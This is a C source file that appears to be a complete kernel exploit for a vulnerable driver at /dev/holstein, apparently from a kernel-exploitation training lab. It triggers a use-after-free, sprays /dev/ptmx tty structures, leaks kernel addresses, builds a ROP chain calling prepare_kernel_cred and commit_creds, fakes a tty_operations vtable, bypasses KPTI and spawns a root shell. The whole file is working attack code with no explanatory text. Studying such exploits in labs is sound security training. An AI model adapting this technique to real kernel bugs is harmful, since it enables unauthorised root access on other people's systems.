#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>

#define pop_rdi (kbase + 0x14078a) // pop rdi ; ret
#define prepare_kernel_cred (kbase + 0x72560)
#define commit_creds (kbase + 0x723c0)
#define mov_rdi_rax_rep_movsq (kbase + 0x638e9b) // mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret
#define pop_rcx (kbase + 0xeb7e4) // pop rcx ; ret
#define kpti_trampoline (kbase + 0x800e26) // skip POP_REGS macro
#define push_rdx_xor_eax_415b004f_pop_rsp_rbp (kbase + 0x14fbea) // push rdx ; xor eax, 0x415b004f ; pop rsp ; pop rbp ; ret

long long user_cs, user_rflags, user_rsp, user_ss;

int spray[100];

void shell() {
    if (getuid() == 0) {
        puts("[+] Got root");
        system("/bin/sh");
    }
}

int main() {
    int fd1 = open("/dev/holstein", O_RDWR);
    int fd2 = open("/dev/holstein", O_RDWR);

    // Trigger UAF
    close(fd1);

    // Spray
    for (int i = 0; i < 50; i++) {
        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);

        if (spray[i] == -1) {
            perror("/dev/ptmx");
        }
    }

    // Leak
    char buf[0x400];
    read(fd2, buf, 0x400);

    //for (int i = 0; i < 0x400/8; i++) {
    //    printf("0x%llx\n", ((long long*)&buf)[i]);
    //}

    long long kbase = *(long long*)&buf[0x18] - 0xc39c60;
    long long g_buf = *(long long*)&buf[0x38] - 0x38;

    printf("[+] Leaked kbase = 0x%llx\n", kbase);
    printf("[+] Leaked g_buf = 0x%llx\n", g_buf);

    // Save state
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_rsp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );

    long long* chain = (long long*)&buf;
    *chain++ = pop_rdi;
    *chain++ = 0;
    *chain++ = prepare_kernel_cred;
    *chain++ = pop_rcx;
    *chain++ = 0;
    *chain++ = mov_rdi_rax_rep_movsq;
    *chain++ = commit_creds;
    *chain++ = kpti_trampoline;
    *chain++ = 0;
    *chain++ = 0;
    *chain++ = (long long)shell;
    *chain++ = user_cs;
    *chain++ = user_rflags;
    *chain++ = user_rsp;
    *chain++ = user_ss;
    
    // Fake tty_operations vtable
    *(long long*)&buf[0x3f8] = push_rdx_xor_eax_415b004f_pop_rsp_rbp;

    write(fd2, buf, 0x400);

    // Second UAF
    int fd3 = open("/dev/holstein", O_RDWR);
    int fd4 = open("/dev/holstein", O_RDWR);

    // Trigger UAF
    close(fd3);

    // Spray
    for (int i = 50; i < 100; i++) {
        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);

        if (spray[i] == -1) {
            perror("/dev/ptmx");
        }
    }

    // Rewrite vtable pointer
    read(fd4, buf, 0x400);
    *(long long*)&buf[0x18] = g_buf + 0x3f8 - 12*8;
    write(fd4, buf, 0x20);


    // Control RIP
    for (int i = 50; i < 100; i++) {
        ioctl(spray[i], 0, g_buf - 8);
    }

    return 0;
}